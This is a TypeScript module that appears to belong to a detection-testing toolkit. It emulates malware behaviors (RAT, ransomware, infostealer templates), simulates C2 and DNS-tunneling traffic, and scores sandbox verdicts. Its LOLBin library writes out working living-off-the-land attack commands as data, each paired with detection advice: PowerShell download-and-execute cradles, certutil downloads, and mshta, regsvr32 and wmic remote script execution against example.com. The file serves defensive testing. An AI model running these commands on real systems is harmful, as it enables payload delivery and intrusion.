import {
  MalwareBehavior,
  MalwareType,
  C2Protocol,
  SandboxResult,
  BehaviorObservation,
  NetworkActivity,
  LOLBin,
  LOLBinCommand
} from '../types';

/**
 * Malware Behavior Emulator
 * Simulates malware behaviors for testing detection capabilities
 */
export class MalwareBehaviorEmulator {
  private behaviors: Map<string, MalwareBehavior> = new Map();

  constructor() {
    this.initializeDefaultBehaviors();
  }

  private initializeDefaultBehaviors(): void {
    // RAT behavior template
    this.addBehavior({
      id: 'rat_basic',
      name: 'Basic RAT',
      type: MalwareType.RAT,
      capabilities: [
        { name: 'Remote Shell', description: 'Execute commands remotely', technique: 'T1059', enabled: true },
        { name: 'File Transfer', description: 'Upload/download files', technique: 'T1105', enabled: true },
        { name: 'Screenshot', description: 'Capture screen', technique: 'T1113', enabled: true },
        { name: 'Keylogger', description: 'Log keystrokes', technique: 'T1056.001', enabled: true },
        { name: 'Process List', description: 'Enumerate processes', technique: 'T1057', enabled: true }
      ],
      c2Config: {
        protocol: C2Protocol.HTTPS,
        servers: ['c2.example.com'],
        port: 443,
        encryption: true,
        beaconInterval: 60,
        jitter: 20,
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
      },
      persistence: [
        { type: 'registry', location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', description: 'Run key persistence', detection: 'Monitor Run key modifications' }
      ],
      evasion: [
        { type: 'obfuscation', description: 'String encryption', implementation: 'XOR with rotating key' },
        { type: 'sandbox-detection', description: 'VM detection', implementation: 'Check for VM artifacts' }
      ],
      payloads: [
        { id: 'shell', name: 'Reverse Shell', type: 'shellcode', description: 'Establishes reverse shell' }
      ],
      indicators: [
        { type: 'mutex', value: 'Global\\RAT_MUTEX_001', context: 'Single instance mutex' },
        { type: 'registry', value: 'HKCU\\Software\\RAT\\Config', context: 'Configuration storage' }
      ],
      metadata: { version: '1.0', platform: 'Windows' }
    });

    // Ransomware behavior template
    this.addBehavior({
      id: 'ransomware_basic',
      name: 'Basic Ransomware',
      type: MalwareType.RANSOMWARE,
      capabilities: [
        { name: 'File Encryption', description: 'Encrypt user files', technique: 'T1486', enabled: true },
        { name: 'Shadow Copy Deletion', description: 'Delete volume shadow copies', technique: 'T1490', enabled: true },
        { name: 'Ransom Note', description: 'Drop ransom note', technique: 'T1491', enabled: true },
        { name: 'Network Spread', description: 'Propagate via SMB', technique: 'T1021.002', enabled: false }
      ],
      c2Config: {
        protocol: C2Protocol.HTTPS,
        servers: ['payment.example.onion'],
        port: 443,
        encryption: true,
        beaconInterval: 3600,
        jitter: 10
      },
      persistence: [],
      evasion: [
        { type: 'anti-debug', description: 'Debugger detection', implementation: 'IsDebuggerPresent check' }
      ],
      payloads: [
        { id: 'encryptor', name: 'File Encryptor', type: 'executable', encoding: 'aes', description: 'AES-256 file encryption' }
      ],
      indicators: [
        { type: 'file', value: '*.encrypted', context: 'Encrypted file extension' },
        { type: 'file', value: 'README_DECRYPT.txt', context: 'Ransom note' }
      ],
      metadata: { version: '1.0', platform: 'Windows' }
    });

    // Infostealer behavior template
    this.addBehavior({
      id: 'infostealer_basic',
      name: 'Basic Infostealer',
      type: MalwareType.INFOSTEALER,
      capabilities: [
        { name: 'Browser Credentials', description: 'Steal browser passwords', technique: 'T1555.003', enabled: true },
        { name: 'Browser Cookies', description: 'Steal browser cookies', technique: 'T1539', enabled: true },
        { name: 'Crypto Wallets', description: 'Steal cryptocurrency wallets', technique: 'T1005', enabled: true },
        { name: 'System Info', description: 'Collect system information', technique: 'T1082', enabled: true }
      ],
      c2Config: {
        protocol: C2Protocol.HTTPS,
        servers: ['exfil.example.com'],
        port: 443,
        encryption: true,
        beaconInterval: 300,
        jitter: 15
      },
      persistence: [],
      evasion: [
        { type: 'obfuscation', description: 'Code obfuscation', implementation: 'Control flow flattening' }
      ],
      payloads: [],
      indicators: [
        { type: 'file', value: '%TEMP%\\stolen_data.zip', context: 'Exfiltration staging' }
      ],
      metadata: { version: '1.0', platform: 'Windows' }
    });
  }

  addBehavior(behavior: MalwareBehavior): void {
    this.behaviors.set(behavior.id, behavior);
  }

  getBehavior(id: string): MalwareBehavior | undefined {
    return this.behaviors.get(id);
  }

  getAllBehaviors(): MalwareBehavior[] {
    return Array.from(this.behaviors.values());
  }

  /**
   * Generate expected behaviors for detection testing
   */
  generateExpectedBehaviors(behaviorId: string): BehaviorObservation[] {
    const behavior = this.behaviors.get(behaviorId);
    if (!behavior) return [];

    const observations: BehaviorObservation[] = [];
    let timestamp = Date.now();

    // Generate observations based on capabilities
    for (const capability of behavior.capabilities) {
      if (!capability.enabled) continue;

      observations.push({
        timestamp: timestamp++,
        category: 'capability',
        action: capability.name,
        target: capability.technique,
        severity: 'high',
        description: capability.description
      });
    }

    // Generate persistence observations
    for (const persistence of behavior.persistence) {
      observations.push({
        timestamp: timestamp++,
        category: 'persistence',
        action: persistence.type,
        target: persistence.location,
        severity: 'critical',
        description: persistence.description
      });
    }

    // Generate evasion observations
    for (const evasion of behavior.evasion) {
      observations.push({
        timestamp: timestamp++,
        category: 'evasion',
        action: evasion.type,
        target: evasion.implementation,
        severity: 'medium',
        description: evasion.description
      });
    }

    // Generate C2 observations
    observations.push({
      timestamp: timestamp++,
      category: 'c2',
      action: 'beacon',
      target: `${behavior.c2Config.protocol}://${behavior.c2Config.servers[0]}:${behavior.c2Config.port}`,
      severity: 'critical',
      description: `C2 communication via ${behavior.c2Config.protocol}`
    });

    return observations;
  }

  /**
   * Generate expected network activity
   */
  generateExpectedNetworkActivity(behaviorId: string): NetworkActivity[] {
    const behavior = this.behaviors.get(behaviorId);
    if (!behavior) return [];

    const activities: NetworkActivity[] = [];
    const timestamp = Date.now();

    // C2 beacon traffic
    for (const server of behavior.c2Config.servers) {
      activities.push({
        timestamp,
        protocol: behavior.c2Config.protocol.toUpperCase(),
        sourceIP: '192.168.1.100',
        sourcePort: Math.floor(Math.random() * 60000) + 1024,
        destIP: server,
        destPort: behavior.c2Config.port,
        domain: server.includes('.') ? server : undefined,
        dataSize: Math.floor(Math.random() * 1000) + 100,
        direction: 'outbound'
      });
    }

    return activities;
  }
}

/**
 * C2 Simulator
 * Simulates command and control communications
 */
export class C2Simulator {
  /**
   * Generate C2 beacon pattern
   */
  generateBeaconPattern(
    protocol: C2Protocol,
    interval: number,
    jitter: number,
    count: number
  ): Array<{ timestamp: number; size: number }> {
    const beacons: Array<{ timestamp: number; size: number }> = [];
    let currentTime = Date.now();

    for (let i = 0; i < count; i++) {
      const jitterMs = (Math.random() * 2 - 1) * (interval * jitter / 100) * 1000;
      currentTime += interval * 1000 + jitterMs;

      beacons.push({
        timestamp: currentTime,
        size: Math.floor(Math.random() * 500) + 50
      });
    }

    return beacons;
  }

  /**
   * Generate C2 command traffic
   */
  generateCommandTraffic(
    commandType: 'shell' | 'upload' | 'download' | 'screenshot' | 'keylog'
  ): { request: string; response: string; size: number } {
    const commands: Record<string, { request: string; response: string; size: number }> = {
      shell: {
        request: 'SHELL|whoami',
        response: 'OK|DESKTOP-ABC\\user',
        size: 150
      },
      upload: {
        request: 'UPLOAD|/path/to/file|<base64_data>',
        response: 'OK|uploaded',
        size: 50000
      },
      download: {
        request: 'DOWNLOAD|C:\\Users\\user\\document.docx',
        response: 'OK|<base64_data>',
        size: 100000
      },
      screenshot: {
        request: 'SCREENSHOT',
        response: 'OK|<base64_image>',
        size: 500000
      },
      keylog: {
        request: 'KEYLOG|get',
        response: 'OK|user typed: password123',
        size: 1000
      }
    };

    return commands[commandType] || commands.shell;
  }

  /**
   * Simulate DNS tunneling
   */
  generateDNSTunnelingTraffic(
    domain: string,
    dataSize: number
  ): string[] {
    const queries: string[] = [];
    const chunkSize = 60; // Max subdomain length
    const chunks = Math.ceil(dataSize / chunkSize);

    for (let i = 0; i < chunks; i++) {
      const randomData = this.generateRandomHex(chunkSize);
      queries.push(`${randomData}.${i}.${domain}`);
    }

    return queries;
  }

  private generateRandomHex(length: number): string {
    let result = '';
    const chars = '0123456789abcdef';
    for (let i = 0; i < length; i++) {
      result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
  }
}

/**
 * LOLBin Library
 * Living Off the Land Binaries for testing
 */
export class LOLBinLibrary {
  private lolbins: Map<string, LOLBin> = new Map();

  constructor() {
    this.initializeLOLBins();
  }

  private initializeLOLBins(): void {
    this.addLOLBin({
      name: 'certutil.exe',
      path: 'C:\\Windows\\System32\\certutil.exe',
      description: 'Certificate utility that can be used for file download and encoding',
      capabilities: ['Download', 'Encode', 'Decode', 'Hash'],
      commands: [
        { name: 'Download File', command: 'certutil -urlcache -split -f http://example.com/file.exe file.exe', description: 'Download file from URL', useCase: 'Payload delivery' },
        { name: 'Base64 Encode', command: 'certutil -encode input.exe output.txt', description: 'Encode file to base64', useCase: 'Data obfuscation' },
        { name: 'Base64 Decode', command: 'certutil -decode input.txt output.exe', description: 'Decode base64 file', useCase: 'Payload reconstruction' }
      ],
      detection: 'Monitor certutil.exe execution with -urlcache or -encode/-decode flags',
      mitreTechniques: ['T1105', 'T1140']
    });

    this.addLOLBin({
      name: 'mshta.exe',
      path: 'C:\\Windows\\System32\\mshta.exe',
      description: 'HTML Application host that can execute scripts',
      capabilities: ['Script Execution', 'Proxy Execution'],
      commands: [
        { name: 'Execute HTA', command: 'mshta http://example.com/payload.hta', description: 'Execute remote HTA', useCase: 'Remote code execution' },
        { name: 'Inline VBS', command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc.exe"":close")', description: 'Execute inline VBScript', useCase: 'Code execution' }
      ],
      detection: 'Monitor mshta.exe spawning child processes or making network connections',
      mitreTechniques: ['T1218.005']
    });

    this.addLOLBin({
      name: 'rundll32.exe',
      path: 'C:\\Windows\\System32\\rundll32.exe',
      description: 'Utility to run DLL files',
      capabilities: ['DLL Execution', 'Proxy Execution'],
      commands: [
        { name: 'Execute DLL', command: 'rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe', description: 'Execute via shell32', useCase: 'Application execution' },
        { name: 'JavaScript', command: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();', description: 'Execute JavaScript', useCase: 'Script execution' }
      ],
      detection: 'Monitor rundll32.exe with unusual DLL paths or command lines',
      mitreTechniques: ['T1218.011']
    });

    this.addLOLBin({
      name: 'regsvr32.exe',
      path: 'C:\\Windows\\System32\\regsvr32.exe',
      description: 'Register COM objects, can execute scripts',
      capabilities: ['DLL Registration', 'Script Execution'],
      commands: [
        { name: 'Scrobj Execution', command: 'regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll', description: 'Execute remote SCT', useCase: 'Proxy execution' }
      ],
      detection: 'Monitor regsvr32.exe with /i flag and network connections',
      mitreTechniques: ['T1218.010']
    });

    this.addLOLBin({
      name: 'wmic.exe',
      path: 'C:\\Windows\\System32\\wbem\\wmic.exe',
      description: 'Windows Management Instrumentation command-line',
      capabilities: ['Process Creation', 'System Discovery', 'Remote Execution'],
      commands: [
        { name: 'Process Create', command: 'wmic process call create "calc.exe"', description: 'Create process via WMI', useCase: 'Process execution' },
        { name: 'Remote Exec', command: 'wmic /node:TARGET process call create "cmd.exe"', description: 'Remote process creation', useCase: 'Lateral movement' },
        { name: 'XSL Execution', command: 'wmic os get /format:"http://example.com/payload.xsl"', description: 'Execute remote XSL', useCase: 'Code execution' }
      ],
      detection: 'Monitor wmic.exe process creation and network activity',
      mitreTechniques: ['T1047', 'T1220']
    });

    this.addLOLBin({
      name: 'powershell.exe',
      path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      description: 'PowerShell scripting engine',
      capabilities: ['Script Execution', 'Download', 'Encoded Commands'],
      commands: [
        { name: 'Download Cradle', command: 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')"', description: 'Download and execute', useCase: 'Payload delivery' },
        { name: 'Encoded Command', command: 'powershell -enc <base64>', description: 'Execute encoded command', useCase: 'Obfuscation' },
        { name: 'Bypass', command: 'powershell -ep bypass -file script.ps1', description: 'Bypass execution policy', useCase: 'Policy bypass' }
      ],
      detection: 'Enable PowerShell logging, monitor for suspicious cmdlets and encoded commands',
      mitreTechniques: ['T1059.001', 'T1105']
    });
  }

  addLOLBin(lolbin: LOLBin): void {
    this.lolbins.set(lolbin.name, lolbin);
  }

  getLOLBin(name: string): LOLBin | undefined {
    return this.lolbins.get(name);
  }

  getAllLOLBins(): LOLBin[] {
    return Array.from(this.lolbins.values());
  }

  searchByCapability(capability: string): LOLBin[] {
    const capLower = capability.toLowerCase();
    return Array.from(this.lolbins.values()).filter(l =>
      l.capabilities.some(c => c.toLowerCase().includes(capLower))
    );
  }

  searchByTechnique(techniqueId: string): LOLBin[] {
    return Array.from(this.lolbins.values()).filter(l =>
      l.mitreTechniques.includes(techniqueId)
    );
  }
}

/**
 * Sandbox Analyzer
 * Analyzes malware behavior in simulated sandbox
 */
export class SandboxAnalyzer {
  /**
   * Analyze behavior and generate sandbox report
   */
  analyzeBehavior(
    sampleHash: string,
    behaviors: BehaviorObservation[],
    networkActivity: NetworkActivity[]
  ): SandboxResult {
    const startTime = Date.now();

    // Calculate verdict based on behaviors
    const criticalBehaviors = behaviors.filter(b => b.severity === 'critical');
    const highBehaviors = behaviors.filter(b => b.severity === 'high');

    let verdict: 'clean' | 'suspicious' | 'malicious';
    let score: number;

    if (criticalBehaviors.length > 0) {
      verdict = 'malicious';
      score = Math.min(100, 70 + criticalBehaviors.length * 10);
    } else if (highBehaviors.length > 2) {
      verdict = 'malicious';
      score = Math.min(100, 50 + highBehaviors.length * 10);
    } else if (highBehaviors.length > 0) {
      verdict = 'suspicious';
      score = 30 + highBehaviors.length * 10;
    } else {
      verdict = 'clean';
      score = 10;
    }

    // Generate signature matches
    const signatures = this.matchSignatures(behaviors);

    return {
      id: this.generateId(),
      sampleHash,
      analysisTime: Date.now() - startTime,
      verdict,
      score,
      behaviors,
      networkActivity,
      fileOperations: [],
      registryOperations: [],
      processActivity: [],
      signatures,
      extractedStrings: [],
      droppedFiles: []
    };
  }

  private matchSignatures(behaviors: BehaviorObservation[]): Array<{
    name: string;
    category: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
    description: string;
    matched: string;
  }> {
    const signatures: Array<{
      name: string;
      category: string;
      severity: 'low' | 'medium' | 'high' | 'critical';
      description: string;
      matched: string;
    }> = [];

    for (const behavior of behaviors) {
      if (behavior.category === 'persistence') {
        signatures.push({
          name: 'Persistence Mechanism Detected',
          category: 'persistence',
          severity: 'critical',
          description: `Persistence via ${behavior.action}`,
          matched: behavior.target
        });
      }

      if (behavior.category === 'c2') {
        signatures.push({
          name: 'C2 Communication Detected',
          category: 'network',
          severity: 'critical',
          description: 'Command and control communication detected',
          matched: behavior.target
        });
      }

      if (behavior.category === 'evasion') {
        signatures.push({
          name: 'Evasion Technique Detected',
          category: 'evasion',
          severity: 'high',
          description: `Evasion: ${behavior.action}`,
          matched: behavior.description
        });
      }
    }

    return signatures;
  }

  private generateId(): string {
    return `sandbox_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }
}
